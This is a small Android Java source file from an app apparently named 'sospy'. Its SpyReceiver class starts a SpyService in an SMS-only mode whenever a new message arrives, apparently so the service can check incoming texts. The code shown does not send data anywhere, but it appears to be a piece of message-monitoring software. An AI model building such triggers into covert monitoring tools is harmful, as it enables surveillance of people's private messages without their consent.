package com.prestomation.android.sospy.spy;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class SpyReceiver extends BroadcastReceiver {

	public static final String SMS_TITLE = "SMS From ";


	@Override
	public void onReceive(Context context, Intent intent)
	{

		Log.i(SetupActivity.TAG, "onReceive..");
		// Tell our service to check for new messages
		// We simply use the receiving of a new message as a trigger
		context.startService(new Intent(context, SpyService.class).putExtra(SpyService.MODE, SpyService.MODE_SMS_ONLY));

		
		
	}

}
